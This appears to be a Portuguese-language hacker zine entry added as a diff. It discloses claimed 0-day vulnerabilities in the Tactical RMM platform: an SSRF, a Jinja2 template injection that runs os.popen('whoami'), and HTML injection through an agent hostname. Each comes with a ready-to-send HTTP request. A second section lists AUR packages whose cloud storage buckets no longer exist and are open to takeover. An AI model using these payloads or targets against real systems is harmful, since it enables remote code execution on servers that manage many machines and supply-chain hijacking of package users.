@@ -1,0 +1,175 @@
+tramoinhas
+
+
+Tactical RMM 0days
+sniss
+
+## Oq é Tactical RMM
+é um sistema de monitoramento e management remoto ( rmm ) open source, codado 
+com django vue eo agente em golang.
+Ele é usado por várias empresas mas também por grupos cybercriminosos como o 
+Scattered Spider
+
+[ https://en.fofa.info/result?qbase64=aWNvbl9oYXNoPSItNjI2NjIyNDQ5Ig%3D%3D  ] 
+
+## Vulnerabilidades no REPORTING 
+A aplicação fornece funcionalidades de criação e exportação de relatórios 
+sobre o sistema, elas geralmente são disponibilizadas para usuários com baixo 
+nível de permissão ( ListReports and WriteReports ), então, decidimos focar nela
+
+```python
+views.py
+
+class SharedTemplatesRepo(APIView):
+    permission_classes = [IsAuthenticated, ReportingPerms]
+    def get(self, request: Request) -> Response:
+        try:
+            url = "https://raw.githubusercontent.com/amidaware/reporting-templates/master/index.json"
+            response = requests.get(url, timeout=15)
+            files = response.json()
+            return Response(
+                [
+                    {"name": file["name"], "url": file["download_url"]}  
+                    for file in files
+                    if file["download_url"]
+                ]
+            )
+     ...
+        try: // SSRF Trecho
+            for template in templates:
+                response = requests.get(template["url"], timeout=10) 
+                template_obj = response.json()
+```
+
+note que ele faz uma request para um parâmetro controlado pelo usuário, assim,
+possibilitando um SSRF
+
+** PoC **:
+
+```javascript
+POST /reporting/templates/shared/ HTTP/1.1
+Host: api.tactical.com
+Authorization: Token b85ddec610245a2d4ed8fa190880236ccfa4a2911964fde84be4fc85a7a43702
+Content-Type: application/json
+Content-Length: 167
+
+{
+  "templates":[
+    {
+        "name":"PoC 123",
+        "url":"http://1hjectbkv0uzhghd4rq84mr1hsnjbb4zt.oastify.com"
+}
+],
+"overwrite":true
+}
+```
+
+```javascript
+HTTP/1.1 400 Bad Request
+
+"Expecting value: line 1 column 1 (char 0)"
+```
+
+encontramos também a funcionalidade preview, dentro do reportings, que 
+basicamente permiti vermos como um trecho em markdown ou html está sendo 
+renderizado, ao usarmos a opção em markdown , conseguimos injetar templates 
+jinja2 diretamente na aplicação por causa da falta de sanitizicao desse campo.
+
+```python
+utils.py
+
+def generate_html(...):
+    # Jinja2
+    env = Environment(
+        loader=FunctionLoader(db_template_loader),
+        extensions=["jinja2.ext.do", "jinja2.ext.loopcontrols"],
+    )
+ ...
+    # Renderiza template do usuário
+    tm = env.from_string(template_string) # permiti a renderização dos templates pelo input do user
+    return tm.render(css=css, **variables_dict) 
+```
+
+** PoC **
+
+```javascript
+POST /reporting/templates/preview/ HTTP/1.1
+Host: api.tactical.com
+Authorization: Token b85ddec610245a2d4ed8fa190880236ccfa4a2911964fde84be4fc85a7a43702
+Content-Type: application/json
+Content-Length: 524
+
+{
+  "template_md": "{% set globals = ''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__ %}\\n{% set builtins = globals['__builtins__'] %}\\n{% set import_func = builtins['__import__'] %}\\n{% set os_module = import_func('os') %}\\n{% set command_output = os_module.popen('whoami').read().strip() %} {{ command_output }}",
+  "type": "markdown",
+  "template_css": "",
+  "template_html": null,
+  "template_variables": {},
+  "dependencies": {},
+  "format": "html",
+  "debug": true
+}
+```
+
+```javascript
+HTTP/1.1 200 OK
+
+"<p>tactical</p>"
+```
+
+## Vulnerabilidades do Agent 
+o Django e o DOMPurify no front-end fornecem uma boa proteção contra html 
+injection e xss, mas só que quando ele não espera que venha um input do user.
+
+```javascript
+function deleteAgent(agent) {
+  const clean = DOMPurify.sanitize(agent.hostname);
+  $q.dialog({
+    title: `Please type <code style="color:red">yes</code> in the box below to confirm deletion of <span style="color:red">${clean}</span>.`,
+    html: true, // permitindo html injection mesmo que o dom purify passe pelo hostname
+  })
+}
+```
+
+** PoC **:
+1.
+```javascript
+POST /api/v3/newagent/ HTTP/2
+Host: api.lizardsec.xyz
+Authorization: Token b4a2e695fecfdaf2978563e9f0a55651761031d12835d0585c1b7ad4efa70ec3
+Content-Type: application/json
+Content-Length: 197
+
+{
+  "agent_id": "randomUUID4",
+  "hostname": "<h1>HTML</h1>",
+  "site": 1,
+  "monitoring_type": "workstation",
+  "description": "xxxx",
+  "mesh_node_id": "mesh-a1b2c3d4",
+  "goarch": "amd64",
+  "plat": "windows"
+}
+```
+2. Tente Deletar o Agent
+
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+
+AUR yay bucket takeovers
+gld
+
+Checked 100901 packages
+Found 302 bucket URLs
+Total time: 19169.63 seconds
+Average time per package: 0.19 seconds
+Working: 295, Broken: 7
+
+[S3] mapcrafter-world113-git: Minecraft.Download - NoSuchBucket
+[S3] mapcrafter-git: Minecraft.Download - NoSuchBucket
+[S3] substratumnode: substratum-website-downloads - NoSuchBucket
+[S3] substratumnode-cli: substratum-website-downloads - NoSuchBucket
+[DO_SPACES] zls-nightly-bin: zigtools-releases.nyc3 - NoSuchBucket
+[S3] synergy1-bin: binaries.symless.com - NoSuchBucket
+[GCS] quill-chat: app-releases-dl.quill.chat - NoSuchBucket
